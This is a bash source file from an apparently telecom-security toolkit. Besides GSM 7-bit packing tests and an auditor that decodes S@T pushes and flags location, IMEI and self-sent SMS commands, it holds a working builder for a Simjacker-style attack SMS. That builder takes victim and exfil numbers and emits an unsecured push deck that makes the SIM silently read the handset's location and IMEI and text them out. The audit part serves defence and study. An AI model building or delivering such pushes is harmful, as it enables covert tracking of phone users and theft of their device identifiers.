    printf 'findings\t%d\n' "$found"
    return 0
}

# ── GSM 7-bit packing KAT ───────────────────────────────────────────────
# TS 23.038 §6.1.2.1.1's own worked example, so the packer is anchored to the
# published result rather than to a round-trip that would pass either way.
otasm_tp_packing_kat() {
    local n=0 got
    # Anchored on TS 23.038 §6.1.2.1.1's normative bit-layout tables, and on
    # the same `hi` vector 38_ussd already asserts, so a regression in either
    # packer is caught by the other module.
    _otasm_kat_case() {
        local text="$1" want="$2" label
        got=$(otasm_tp_pack_text "$text")
        label="kat_$(printf '%s' "$text" | tr -c 'A-Za-z0-9' _)"
        printf '%s\t%s\n' "$label" "$got"
        if [[ "$got" == "$want" ]]; then
            printf '%s_ok\tPASS\n' "$label"
        else
            printf '%s_ok\tFAIL want=%s got=%s\n' "$label" "$want" "$got"
            n=$(( n + 1 ))
        fi
        local back
        back=$(otasm_tp_unpack_text "$got" "${#text}")
        if [[ "$back" == "$text" ]]; then
            printf '%s_roundtrip\tPASS\n' "$label"
        else
            printf '%s_roundtrip\tFAIL want=%s got=%s\n' "$label" "$text" "$back"
            n=$(( n + 1 ))
        fi
    }
    _otasm_kat_case hi e834
    _otasm_kat_case Hi c834
    _otasm_kat_case hello e8329bfd06
    _otasm_kat_case Hello c8329bfd06
    printf 'failures\t%d\n' "$n"
    return $(( n > 0 ))
}

# ── S@T push: SIMalliance S@T 01.00 decks on the S@T 01.23 push ─────────
# A S@T push is not a 0xD0 envelope. The deck travels as the secured data of a
# TS 31.115 §4.2 command packet under TAR "PSH" = 0x505348 (S@T 01.23 §7), in an
# SMS whose TP-PID is 0x7F (TS 23.040 §9.2.3.9) and whose TP-UDH carries IEI
# 0x70, the marker that a SIM Toolkit security header follows (TS 23.040
# §9.2.3.24.7). The 0xD0 proactive command appears only when the card's S@T
# browser executes a 0x2D STK generic macro (S@T 01.00 §6.2.9), which is the
# *card to terminal* direction. So --sat-push prints the real push and the D0
# each macro renders to, and cross-checks that rendering octet for octet
# against modules/52_stk.sh rather than duplicating it silently.

# TL[A]V (S@T 01.00 §4): a one-octet tag whose bit 8 flags an attribute byte, a
# BER length, then the value. Nothing here needs an attribute byte, so every tag
# written has bit 8 clear and the length counts the value octets alone.
otasm_sat_tlv() {
    local tag val l
    tag=$(otasm_norm_hex "${1:-}"); val=$(otasm_norm_hex "${2:-}")
    otasm_is_hex "$tag" && (( ${#tag} == 2 )) || {
        printf 'ERROR\tS@T tag must be one octet of hex\n' >&2; return 2; }
    [[ -z "$val" ]] || otasm_is_hex "$val" || {
        printf 'ERROR\tS@T value must be hex\n' >&2; return 2; }
    l=$(otasm_berlen "$(( ${#val} / 2 ))") || return 2
    printf '%s%s%s\n' "${tag,,}" "${l,,}" "${val,,}"
}

# STK generic macro (S@T 01.00 §6.2.9). The value is the command type and
# qualifier of TS 102 223 §9.4/§8.6, the destination device of §8.7, then the
# command's own COMPREHENSION-TLVs. The browser renders the macro as the
# proactive command "D0 L 01 03 <number> <type> <qualifier> 02 02 81 <dest>".
otasm_sat_stk_macro() {
    local type qual dest value f t
    type=$(otasm_norm_hex "${1:-}"); qual=$(otasm_norm_hex "${2:-}")
    dest=$(otasm_norm_hex "${3:-82}")
    local params=("${@:4}")
    for f in "$type" "$qual" "$dest"; do
        otasm_is_hex "$f" && (( ${#f} == 2 )) || {
            printf 'ERROR\tS@T macro needs a one-octet command type, qualifier and destination device\n' >&2
            return 2; }
    done
    value="${type}${qual}${dest}"
    for t in "${params[@]}"; do
        [[ -z "$t" ]] && continue
        t=$(otasm_norm_hex "$t")
        otasm_is_hex "$t" || {
            printf 'ERROR\tS@T macro parameter must be hex\n' >&2; return 2; }
        value+="$t"
    done
    otasm_sat_tlv 2D "$value"
}

# PROVIDE LOCAL INFORMATION has no command-specific data object (TS 102 223
# §6.6.15), so the qualifier alone picks the datum: 00 location information,
# 01 IMEI of the terminal (TS 102 223 §8.6).
otasm_sat_pli_macro() { otasm_sat_stk_macro 26 "${1:-00}" "${2:-82}"; }

# SEND SHORT MESSAGE (TS 102 223 §6.6.9) needs the 3GPP-SMS TPDU data object,
# tag 0x0B (ETSI TS 131 111 §8.13), and nothing else: with no Address data
# object the ME inserts its own service centre, so the message leaves the
# handset without the card knowing or needing to name one.
otasm_sat_send_sms_macro() {
    local tpdu tlv
    tpdu=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$tpdu" || {
        printf 'ERROR\tSEND SHORT MESSAGE needs a hex 3GPP-SMS TPDU\n' >&2; return 2; }
    tlv=$(otasm_sat_tlv 0B "$tpdu") || return 2
    otasm_sat_stk_macro 13 00 "${2:-82}" "$tlv"
}

# Card (S@T 01.00 §5.3.6): card id element, then the byte code elements. No
# attribute byte, so the card runs once in the order the deck lists it.
otasm_sat_card() {
    local id value bc
    id=$(otasm_norm_hex "${1:-01}")
    value=$(otasm_sat_tlv 06 "$id") || return 2
    local bcs=("${@:2}")
    for bc in "${bcs[@]}"; do
        [[ -z "$bc" ]] && continue
        bc=$(otasm_norm_hex "$bc")
        otasm_is_hex "$bc" || {
            printf 'ERROR\tS@T byte code must be hex\n' >&2; return 2; }
        value+="$bc"
    done
    otasm_sat_tlv 05 "$value"
}

# Deck (S@T 01.00 §5.3.2): deck id element, then its cards. No SPS, no variable
# reference list, no text table and no card template, so this is a static deck.
otasm_sat_deck() {
    local id value c
    id=$(otasm_norm_hex "${1:-01}")
    value=$(otasm_sat_tlv 02 "$id") || return 2
    local cards=("${@:2}")
    for c in "${cards[@]}"; do
        [[ -z "$c" ]] && continue
        c=$(otasm_norm_hex "$c")
        otasm_is_hex "$c" || {
            printf 'ERROR\tS@T card must be hex\n' >&2; return 2; }
        value+="$c"
    done
    otasm_sat_tlv 01 "$value"
}


# Variable reference (S@T 01.00 §5.5.1, tag 0x08): the encapsulated form, whose
# value is the variable's identification code. Distinct from the simple form of
# §5.4.7, which is the bare byte and appears only inside a substitution.
otasm_sat_varref() {
    local varid
    varid=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$varid" && (( ${#varid} == 2 )) || {
        printf 'ERROR\tS@T variable reference needs a one-octet variable id\n' >&2; return 2; }
    otasm_sat_tlv 08 "$varid"
}

# Substitution (S@T 01.00 §5.4.8): a length field of 0xFF means "the value is not
# here, it is in this variable". This is how a terminal response -- a location, an
# IMEI -- gets into an outgoing message, and it is the half of Simjacker that
# turns a deck into a collector. The tag is the tag of whatever the parameter
# would have been, because only its value is replaced.
otasm_sat_substitution() {
    local tag varid
    tag=$(otasm_norm_hex "${1:-}"); varid=$(otasm_norm_hex "${2:-}")
    otasm_is_hex "$tag" && (( ${#tag} == 2 )) || {
        printf 'ERROR\tS@T substitution needs a one-octet tag\n' >&2; return 2; }
    otasm_is_hex "$varid" && (( ${#varid} == 2 )) || {
        printf 'ERROR\tS@T substitution needs a one-octet variable id\n' >&2; return 2; }
    otasm_is_hex "$tag${varid}"
    printf '%sFF%s\n' "${tag,,}" "${varid,,}"
}

# Concatenate (S@T 01.00 §6.2.4, tag 0x24): destination variable first, then two
# or more values, each either a variable reference (tag 0x08) or an inline value
# (tag 0x0A). The result is in LV form and sits in the destination variable.
otasm_sat_concat() {
    local dest varid value body
    dest=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$dest" && (( ${#dest} == 2 )) || {
        printf 'ERROR\tS@T CONCATENATE needs a one-octet destination variable\n' >&2; return 2; }
    [[ $# -ge 3 ]] || {
        printf 'ERROR\tS@T CONCATENATE needs at least two values\n' >&2; return 2; }
    value="${dest,,}"
    shift
    for varid in "$@"; do
        [[ -z "$varid" ]] && continue
        body=$(otasm_sat_varref "$varid") || return 2
        value+="$body"
    done
    otasm_sat_tlv 24 "$value"
}

# Generic push command (S@T 01.23 §6.1): the push tag around the deck. No push
# name element, so the browser puts no prompt in front of the user -- which is
# the whole point of the low priority push of §7.
otasm_sat_push_cmd() { otasm_sat_tlv 42 "$(otasm_norm_hex "${1:-}")"; }

# The canonical deck Simjacker's public description spells out: the card reads
# its own location and IMEI into variables and then sends an SMS by itself. The
# exfiltrating message is a complete SMS-SUBMIT built here too, so the octets
# that leave the card can be audited rather than taken on trust.
otasm_sat_deck_build() {
    local exfil="${1:-15559876543}" text="${2:-S@T-PUSH}"
    local da nsept inner m1 m2 m3 card deck push
    da=$(otasm_tp_addr_build 1 1 "$exfil") || return 2
    nsept=$(otasm_tp_septets "$text" | wc -w | tr -d ' ') || return 2
    inner=$(otasm_tpdu_build_submit "$da" 00 00 "$(otasm_tp_pack_text "$text")" \
        "$nsept" 0 0 "" 0) || return 2
    m1=$(otasm_sat_pli_macro 00 82) || return 2
    m2=$(otasm_sat_pli_macro 01 82) || return 2
    m3=$(otasm_sat_send_sms_macro "$inner" 82) || return 2
    card=$(otasm_sat_card 01 "$m1" "$m2" "$m3") || return 2
    deck=$(otasm_sat_deck 01 "$card") || return 2
    push=$(otasm_sat_push_cmd "$deck") || return 2
    printf 'inner_tpdu\t%s\n' "$inner"
    printf 'bytecode_location\t%s\nbytecode_imei\t%s\nbytecode_sms\t%s\n' "$m1" "$m2" "$m3"
    printf 'card_hex\t%s\ndeck_hex\t%s\npush_hex\t%s\n' "$card" "$deck" "$push"
    return 0
}

# The rendering S@T 01.00 §6.2.9 specifies: command details (number, type,
# qualifier), device identities (UICC to the macro's destination), then the
# macro's own TLVs, all inside a D0 envelope whose BER length counts the body.
otasm_sat_render_d0() {
    local num type qual dst body tlv
    num=$(otasm_norm_hex "${1:-01}"); type=$(otasm_norm_hex "${2:-}")
    qual=$(otasm_norm_hex "${3:-}"); dst=$(otasm_norm_hex "${4:-82}")
    [[ ${#num} -eq 2 && ${#type} -eq 2 && ${#qual} -eq 2 && ${#dst} -eq 2 ]] || {
        printf 'ERROR\trendered command needs one-octet number, type, qualifier and destination\n' >&2
        return 2; }
    body=$(otasm_sat_tlv 01 "${num}${type}${qual}") || return 2
    body+=$(otasm_sat_tlv 02 "81${dst}") || return 2
    local params=("${@:5}")
    for tlv in "${params[@]}"; do
        [[ -z "$tlv" ]] || body+=$(otasm_norm_hex "$tlv")
    done
    otasm_sat_tlv D0 "$body"
}

# modules/52_stk.sh builds the same D0 COMPREHENSION-TLVs from the same clauses.
# Driving it from the CLI and comparing octets keeps this rendering honest: an
# independent builder that agrees is evidence, a duplicate that disagrees
# silently is the defect.
otasm_sat_stk52() {
    local type="${1:-}" qual="${2:-}" src="${3:-81}" dst="${4:-82}" num="${5:-01}"
    local m="$IMSISTING_ROOT/modules/52_stk.sh"
    [[ -f "$m" ]] || {
        printf 'ERROR\tmodules/52_stk.sh is not present; the rendered command cannot be cross-checked\n' >&2
        return 1; }
    bash "$m" --build "$type" "$qual" "$src" "$dst" "$num" 2>/dev/null | tail -n 1 | tr -d '[:space:]'
}

# 52_stk writes only the command details and device identities, so a macro that
# carries further TLVs (SEND SHORT MESSAGE) is compared on the part both build.
otasm_sat_cmp52() {
    local mine ref ro mo refbody mybody
    mine=$(otasm_norm_hex "${1:-}"); ref=$(otasm_norm_hex "${2:-}")
    [[ -n "$mine" && -n "$ref" ]] || { printf 'mismatch\n'; return 0; }
    ro=$(otasm_berlen_read "$ref" 1 | cut -f2)
    mo=$(otasm_berlen_read "$mine" 1 | cut -f2)
    [[ -n "$ro" && -n "$mo" ]] || { printf 'mismatch\n'; return 0; }
    refbody=${ref:$(( (1 + ro) * 2 ))}
    mybody=${mine:$(( (1 + mo) * 2 ))}
    [[ "$mybody" == "$refbody"* ]] && printf 'match\n' || printf 'mismatch\n'
}

otasm_sat_cc52() {
    local d0="${1:-}" ref
    ref=$(otasm_sat_stk52 "${2:-}" "${3:-}" 81 82 01 2>/dev/null) || ref=""
    if [[ -z "$ref" ]]; then printf 'skip\n'; return 0; fi
    otasm_sat_cmp52 "$d0" "$ref"
}

# ── auditing an S@T push: what the deck tells a card to do (R9) ────────
#
# A push is opaque on the wire: a TS 31.115 envelope, a UDH carrier, then S@T
# TLVs. Building one is half the job; the other half is reading one back and
# saying what it does, because "a binary SMS arrived" and "a binary SMS told the
# card to read the terminal's location and send it to a number" are different
# facts and only the second one is actionable.
#
# The walk is tag-by-tag with the BER length, and an unknown tag stops it with a
# refusal rather than a guess: a tag this tree does not know is not a tag it can
# explain.
otasm_sat_find_push() {  # <hex> -> the S@T push TLV, or empty
    local h; h=$(otasm_norm_hex "${1:-}")
    (( ${#h} >= 4 )) || return 0
    local i byte len total
    for (( i = 0; i + 3 < ${#h}; i += 2 )); do
        byte="${h:i:2}"
        [[ "${byte,,}" == "42" ]] || continue
        # The length octet follows the tag, so read it one octet further on.
        local info; info=$(otasm_berlen_read "$h" $(( i / 2 + 1 )) 2>/dev/null) || continue
        len=$(printf '%s' "$info" | cut -f1)
        local lhdr; lhdr=$(printf '%s' "$info" | cut -f2)
        [[ -n "$len" && -n "$lhdr" ]] || continue
        total=$(( 1 + lhdr + len ))
        if (( i / 2 + total <= ${#h} / 2 )); then
            printf '%s' "${h:i:$(( total * 2 ))}"
            return 0
        fi
    done
    return 0
}

# Walk TLVs in a body: prints "<tag>	<value>" per element, or a refusal.
otasm_sat_walk() {  # <body-hex>
    local h; h=$(otasm_norm_hex "${1:-}")
    local off=0 n=$(( ${#h} / 2 ))
    while (( off < n )); do
        local tag="${h:$(( off * 2 )):2}"
        local info len
        info=$(otasm_berlen_read "$h" $(( off + 1 )) 2>/dev/null) || {
            printf 'ERROR\tS@T TLV at octet %d has no readable BER length\n' "$off" >&2
            return 1; }
        len=$(printf '%s' "$info" | cut -f1)
        local lhdr; lhdr=$(printf '%s' "$info" | cut -f2)
        [[ -n "$len" && -n "$lhdr" ]] || return 1
        local value="${h:$(( (off + 1 + lhdr) * 2 )):$(( len * 2 ))}"
        (( ${#value} == len * 2 )) || {
            printf 'ERROR\tS@T TLV %s at octet %d claims %d octets and the body has fewer\n' \
                "$tag" "$off" "$len" >&2
            return 1; }
        printf '%s\t%s\n' "${tag^^}" "$value"
        off=$(( off + 1 + lhdr + len ))
    done
    return 0
}

# TS 102 223 command type -> what it is (the ones a deck in this tree uses, and
# the ones worth naming in a finding).
otasm_sat_command_name() {
    case "${1^^}" in
        13) printf 'SEND SHORT MESSAGE (TS 102 223 6.6.9)' ;;
        26) printf 'PROVIDE LOCAL INFORMATION (TS 102 223 6.6.15)' ;;
        16) printf 'SET UP CALL (TS 102 223 6.6.20)' ;;
        17) printf 'SEND SS (TS 102 223 6.6.11)' ;;
        18) printf 'SEND USSD (TS 102 223 6.6.12)' ;;
        25) printf 'SET UP MENU (TS 102 223 6.6.8)' ;;
        27) printf 'TIMER MANAGEMENT (TS 102 223 6.6.21)' ;;
        28) printf 'PROVIDE LOCAL INFORMATION / LANGUAGE (TS 102 223 6.6.15)' ;;
        29) printf 'PLAY TONE (TS 102 223 6.6.16)' ;;
        32) printf 'DISPLAY TEXT (TS 102 223 6.6.1)' ;;
        33) printf 'GET INKEY (TS 102 223 6.6.2)' ;;
        34) printf 'GET INPUT (TS 102 223 6.6.3)' ;;
        35) printf 'SELECT ITEM (TS 102 223 6.6.4)' ;;
        36) printf 'SET UP MENU (TS 102 223 6.6.8)' ;;
        37) printf 'PROVIDE LOCAL INFORMATION (TS 102 223 6.6.15)' ;;
        64) printf 'REFRESH (TS 102 223 6.4.7)' ;;
        *)  printf 'unnamed command type 0x%s' "${1^^}" ;;
    esac
}

otasm_sat_pli_meaning() {
    case "${1^^}" in
        00) printf 'location information (MCC/MNC, LAC/TAC, cell id)' ;;
        01) printf 'IMEI of the terminal' ;;
        02) printf 'network measurement results' ;;
        03) printf 'date, time and time zone' ;;
        04) printf 'language setting' ;;
        05) printf 'access technology' ;;
        *)  printf 'qualifier 0x%s (TS 102 223 8.6)' "${1^^}" ;;
    esac
}

# --sat-audit <push_hex | ts31.115 packet | TPDU>
otasm_sat_audit() {
    local raw; raw=$(otasm_norm_hex "${1:-}")
    [[ -n "$raw" ]] || { printf 'ERROR\tusage: --sat-audit <push_hex>\n' >&2; return 2; }
    otasm_is_hex "$raw" || { printf 'ERROR\tnot hex\n' >&2; return 2; }

    local push; push=$(otasm_sat_find_push "$raw")
    [[ -n "$push" ]] || {
        printf 'ERROR\tno S@T push (tag 0x42) in %d octets of input\n' "$(( ${#raw} / 2 ))" >&2
        printf 'WHY\ta push starts with the S@T push tag 0x42 and a BER length; without that tag this is not one\n' >&2
        return 1; }

    printf 'push\t%s\n' "$push"
    printf 'push_octets\t%d\n' "$(( ${#push} / 2 ))"
    if [[ "$push" != "$raw" ]]; then
        printf 'transport\twrapped: %d octets of envelope around the push\n' \
            "$(( (${#raw} - ${#push}) / 2 ))"
    else
        printf 'transport\tbare push (no TS 31.115 envelope)\n'
    fi

    local lhdr; lhdr=$(otasm_berlen_read "$push" 1 | cut -f2)
    local body="${push:$(( (1 + lhdr) * 2 ))}"   # skip the 42 tag and its length
    local decktag deckid cardtag cardid rest deck_walk card_walk
    deck_walk=$(otasm_sat_walk "$body") || return 1
    decktag=$(printf '%s\n' "$deck_walk" | awk -F'\t' '$1=="01"{print $1; exit}')
    [[ "$decktag" == "01" ]] || {
        printf 'ERROR\tthe push has no deck (tag 0x01)\n' >&2; return 1; }
    local deckbody; deckbody=$(printf '%s\n' "$deck_walk" | awk -F'\t' '$1=="01"{print $2; exit}')
    local deck_inner; deck_inner=$(otasm_sat_walk "$deckbody") || return 1
    deckid=$(printf '%s\n' "$deck_inner" | awk -F'\t' '$1=="02"{print $2; exit}')
    cardbody=$(printf '%s\n' "$deck_inner" | awk -F'\t' '$1=="05"{print $2; exit}')
    printf 'deck_id\t%s\n' "${deckid:-none}"
    [[ -n "$cardbody" ]] || {
        printf 'ERROR\tthe deck carries no card (tag 0x05)\n' >&2; return 1; }

    local card_inner; card_inner=$(otasm_sat_walk "$cardbody") || return 1
    cardid=$(printf '%s\n' "$card_inner" | awk -F'\t' '$1=="06"{print $2; exit}')
    printf 'card_id\t%s\n' "${cardid:-none}"

    local n=0 t v ctype cqual cdest meaning
    local -a findings=()
    while IFS=$'\t' read -r t v; do
        [[ "$t" == "2D" ]] || continue
        n=$(( n + 1 ))
        ctype="${v:0:2}"; cqual="${v:2:2}"; cdest="${v:4:2}"
        printf 'command.%d.type\t0x%s\n' "$n" "$ctype"
        printf 'command.%d.name\t%s\n' "$n" "$(otasm_sat_command_name "$ctype")"
        printf 'command.%d.qualifier\t0x%s\n' "$n" "$cqual"
        printf 'command.%d.destination\t0x%s\n' "$n" "$cdest"
        case "${ctype^^}" in
            26|37)
                meaning=$(otasm_sat_pli_meaning "$cqual")
                printf 'command.%d.meaning\t%s\n' "$n" "$meaning"
                case "${cqual^^}" in
                    00) findings+=("the card is told to read the terminal's location") ;;
                    01) findings+=("the card is told to read the terminal's IMEI") ;;
                esac ;;
            13)
                # The 3GPP-SMS TPDU rides in data object 0x0B (TS 131 111 8.13).
                local tpdus; tpdus=$(otasm_sat_walk "${v:6}")
                local tpdu; tpdu=$(printf '%s\n' "$tpdus" | awk -F'\t' '$1=="0B"{print $2; exit}')
                if [[ -n "$tpdu" ]]; then
                    printf 'command.%d.tpdu\t%s\n' "$n" "$tpdu"
                    local da da_digits
                    da=$(otasm_tpdu_parse "$tpdu" 2>/dev/null | awk -F'\t' '$1=="da"{print $2; exit}')
                    da_digits=$(otasm_tpdu_parse "$tpdu" 2>/dev/null | awk -F'\t' '$1=="da_value"{print $2; exit}')
                    if [[ -n "$da_digits" ]]; then
                        printf 'command.%d.sms_destination\t%s\n' "$n" "$da_digits"
                        printf 'command.%d.sms_destination_octets\t%s\n' "$n" "$da"
                    elif [[ -n "$da" ]]; then
                        printf 'command.%d.sms_destination\t%s\n' "$n" "$da"
                    fi
                    findings+=("the card is told to send an SMS by itself")
                    [[ -n "$da_digits" ]] && findings+=("the SMS destination is $da_digits, named in the message rather than chosen by the operator")
                else
                    printf 'command.%d.meaning\tno 3GPP-SMS TPDU data object found\n' "$n"
                fi ;;
            *)
                printf 'command.%d.meaning\t%s\n' "$n" "$(otasm_sat_command_name "$ctype")" ;;
        esac
    done <<< "$card_inner"
    printf 'commands\t%d\n' "$n"
    local i=0
    for f in "${findings[@]}"; do i=$(( i + 1 )); printf 'finding.%d\t%s\n' "$i" "$f"; done
    if (( ${#findings[@]} > 0 )); then
        printf 'verdict\texecutes on the card: it reads terminal data and/or sends a message the operator did not compose\n'
    else
        printf 'verdict\tno command this audit recognises as terminal-data or message-exfiltration\n'
    fi
    printf 'ref\tS@T 01.00 5.3/6.2.9, TS 102 223 6.6/8.6, TS 31.115 4.2\n'
    printf 'limit\tthis reads the deck; whether the SIM browser supports the command is a property of that card, not of the message\n'
    printf 'sent\t0\n'
}

# The S@T commands this tree builds, with the clause each rests on.
otasm_sat_catalogue() {
    printf 'tag\tcommand\tclause\tdirection\n'
    printf '42\tpush (generic deck)\tS@T 01.23 6.1\tOTA to card\n'
    printf '01\tdeck\tS@T 01.00 5.3.2\tin push\n'
    printf '05\tcard\tS@T 01.00 5.3.6\tin deck\n'
    printf '2D\tSTK generic macro\tS@T 01.00 6.2.9\tin card\n'
    printf '26\tPROVIDE LOCAL INFORMATION (location, IMEI)\tTS 102 223 6.6.15\tmacro\n'
    printf '13\tSEND SHORT MESSAGE\tTS 102 223 6.6.9\tmacro\n'
    printf '0B\t3GPP-SMS TPDU data object\tTS 131 111 8.13\tin macro\n'
    printf '08\tvariable reference\tS@T 01.00 5.5.1\tin macro value\n'
    printf '24\tCONCATENATE\tS@T 01.00 6.2.4\tmacro\n'
    printf 'FF\tsubstitution\tS@T 01.00 5.4.8\tin macro value\n'
    printf 'WIB\tWIB push\tno citable clause\trefused\n'
    printf 'note\tthe WIB row is a refusal, not a plan: no WIB command encoding is citable from this tree, so none is invented\n'
}

# --sat-push [<victim-msisdn>] [<exfil-msisdn>] [<spi>]
# The SPI defaults to 0000, the no-security value the public SIMjacker samples
# carry. S@T 01.23 §7 recommends a non-zero SPI and names 12 (CC, counter mode
# 2) as the interoperable one, which this verb builds as 1200 when asked and
# then needs OTASM_KID_KEY for the CC.
otasm_sat_push_build() {
    local victim="${1:-15551234567}" exfil="${2:-15559876543}" spi
    spi=$(otasm_norm_hex "${3:-0000}")
    otasm_is_hex "$spi" && (( ${#spi} == 4 )) || {
        printf 'ERROR\tSPI must be two octets of hex (0000 no security, 1200 CC)\n' >&2
        return 2; }
    local da pts pt deckts push inner ud udl tpdu
    da=$(otasm_tp_addr_build 1 1 "$victim") || return 2
    deckts=$(otasm_sat_deck_build "$exfil") || return 2
    push=$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="push_hex"{print $2; exit}')
    [[ -n "$push" ]] || { printf 'ERROR\tthe S@T deck did not build\n' >&2; return 2; }

    # The card-routed transport: TAR "PSH" (S@T 01.23 §7) in the TS 31.115 §4.2
    # packet, and the packet in the TP-UD behind the IEI 0x70 marker.
    pts=$(otasm_packet_sms_build 505348 0 "$spi" 00 00 "$push") || return 2
    pt=$(printf '%s\n' "$pts" | awk -F'\t' '$1=="packet"{print $2; exit}')
    [[ -n "$pt" ]] || {
        printf 'ERROR\tthe TS 31.115 command packet did not build\n' >&2; return 2; }
    pt=${pt,,}
    ud="027000${pt}"
    udl=$(( ${#ud} / 2 ))
    tpdu=$(otasm_tpdu_build_submit "$da" 7f f6 "$ud" "$udl" 0 0 "" 0x40) || return 2
    tpdu=${tpdu,,}

    inner=$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="inner_tpdu"{print $2; exit}')
    local d0loc d0imei d0sms dpt
    d0loc=$(otasm_sat_render_d0 01 26 00 82) || return 2
    d0imei=$(otasm_sat_render_d0 01 26 01 82) || return 2
    d0sms=$(otasm_sat_render_d0 01 13 00 82 "$(otasm_sat_tlv 0B "$inner")") || return 2
    local cc_loc cc_imei cc_sms
    cc_loc=$(otasm_sat_cc52 "$d0loc" 26 00)
    cc_imei=$(otasm_sat_cc52 "$d0imei" 26 01)
    cc_sms=$(otasm_sat_cc52 "$d0sms" 13 00)

    printf 'pdu_type\tsat-push\n'
    printf 'envelope\t%s\n' \
        'TS 31.115 §4.2 SMS command packet, TAR 505348 ("PSH", S@T 01.23 §7); secured data = S@T push 42 over deck 01 over card 05, carried in an SMS-SUBMIT whose TP-UDH is IEI 70 (TS 23.040 §9.2.3.24.7)'
    printf 'commands\t%s\n' \
        '3 STK generic macros (0x2D): 26/00 PROVIDE LOCAL INFORMATION location, 26/01 PROVIDE LOCAL INFORMATION IMEI, 13/00 SEND SHORT MESSAGE carrying a 0B 3GPP-SMS TPDU'
    printf 'bytes\t%d\n' "$(( ${#tpdu} / 2 ))"
    printf 'hex\t%s\n' "$tpdu"
    printf 'sent\t0\n'
    printf 'tp_layer\tsms-submit TPDU (TS 23.040 §9.2.2.2) with TP-UDHI set; TP-UD = UDH 02 70 00 then the packet\n'
    printf 'tp_fo\t%s\n' "${tpdu:0:2}"
    printf 'tp_da\t%s\n' "$da"
    printf 'tp_pid\t7f\n'
    printf 'tp_dcs\tf6\n'
    printf 'tp_udl\t%s\n' "$(printf '%02x' "$udl")"
    printf 'udh_hex\t027000\n'
    printf 'ud_hex\t%s\n' "$ud"
    printf 'tpdu_with_sca\t%s\n' "00${tpdu}"
    printf 'ota_packet_hex\t%s\n' "$pt"
    printf 'spi\t%s\n' "$spi"
    printf 'push_hex\t%s\n' "$push"
    printf 'deck_hex\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="deck_hex"{print $2; exit}')"
    printf 'card_hex\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="card_hex"{print $2; exit}')"
    printf 'bytecode_location\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_location"{print $2; exit}')"
    printf 'bytecode_imei\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_imei"{print $2; exit}')"
    printf 'bytecode_sms\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_sms"{print $2; exit}')"
    printf 'inner_tpdu_hex\t%s\n' "$inner"
    printf 'rendered_d0_location\t%s\n' "$d0loc"
    printf 'rendered_d0_imei\t%s\n' "$d0imei"
    printf 'rendered_d0_sms\t%s\n' "$d0sms"
    printf 'crosscheck_location\t%s\n' "$cc_loc"
    printf 'crosscheck_imei\t%s\n' "$cc_imei"
    printf 'crosscheck_sms\t%s\n' "$cc_sms"

    # Each S@T element named with its length, so the hex is readable as a
    # structure rather than as a blob.
    printf 'tlv\t%s\n' "42 push command (S@T 01.23 §6.1), $(( ${#push} / 2 )) octets, no push name so no user prompt"
    printf 'tlv\t%s\n' "01 deck (S@T 01.00 §5.3.2)"
    printf 'tlv\t%s\n' "02 deck id = 01"
    printf 'tlv\t%s\n' "05 card (S@T 01.00 §5.3.6)"
    printf 'tlv\t%s\n' "06 card id = 01"
    printf 'tlv\t%s\n' "2d STK generic macro: 26/00 PROVIDE LOCAL INFORMATION location (S@T 01.00 §6.2.9 + TS 102 223 §9.4/§8.6)"
    printf 'tlv\t%s\n' "2d STK generic macro: 26/01 PROVIDE LOCAL INFORMATION IMEI"
    printf 'tlv\t%s\n' "2d STK generic macro: 13/00 SEND SHORT MESSAGE with 0b 3GPP-SMS TPDU (TS 102 223 §6.6.9, TS 131 111 §8.13)"

    printf 'ref\t%s\n' 'S@T 01.23 §6.1 — generic push command: push tag, optional push name, deck'
    printf 'ref\t%s\n' 'S@T 01.23 §7 — low priority push uses TAR "PSH" 0x505348 and recommends a non-zero SPI (0x12)'
    printf 'ref\t%s\n' 'S@T 01.00 §4 — TL[A]V: tag, BER length, value; bit 8 of the tag flags an attribute byte'
    printf 'ref\t%s\n' 'S@T 01.00 §5.3.2 — deck: deck id, optional SPS/varref list/text table/card template, cards'
    printf 'ref\t%s\n' 'S@T 01.00 §5.3.6 — card: card id then byte code elements'
    printf 'ref\t%s\n' 'S@T 01.00 §6.2.9 — STK generic macro: type, qualifier, destination device, TLVs, rendered as D0 with 01 03 <no> <type> <qual> and 02 02 81 <dest>'
    printf 'ref\t%s\n' 'TS 102 223 §9.4 — type of command 26 PROVIDE LOCAL INFORMATION, 13 SEND SHORT MESSAGE'
    printf 'ref\t%s\n' 'TS 102 223 §8.6 — PLI qualifier 00 location, 01 IMEI; §8.7 device identities 81 UICC, 82 terminal'
    printf 'ref\t%s\n' 'TS 102 223 §6.6.9 — SEND SHORT MESSAGE needs the 3GPP-SMS TPDU; with no Address data object the ME inserts its own service centre'
    printf 'ref\t%s\n' 'ETSI TS 131 111 §8.13 — 3GPP-SMS TPDU data object tag 0B, TPDU formatted per TS 23.040'
    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.24.7 — UDH IEI 70 says a SIM Toolkit security header follows the TP-UDH'
    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.9 — TP-PID 0x7F = (U)SIM data download'
    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.9 — (U)SIM Data download sets TP-PID 0x7F and message class 2, and names 8 bit message class 2 with bit coding 11110110 = 0xF6'
    printf 'ref\t%s\n' 'TS 23.040 §9.1.2.5 — TP-DA is a length octet, a type-of-address octet and semi-octet digits'
    printf 'ref\t%s\n' 'TS 31.115 §4.2 / TS 102 225 §5.1.1 — CPL, CHL, SPI, KIc, KID, TAR, CNTR, PCNTR, secured data'

    printf 'limit\t%s\n' 'the card S@T browser is not modelled: what the deck does needs EF_SST service 26 (SMS-PP download) and 29 (proactive UICC) enabled and a S@T applet present'
    printf 'limit\t%s\n' 'no delivery: an SMSC or OTA gateway is needed, so sent is 0 by construction'
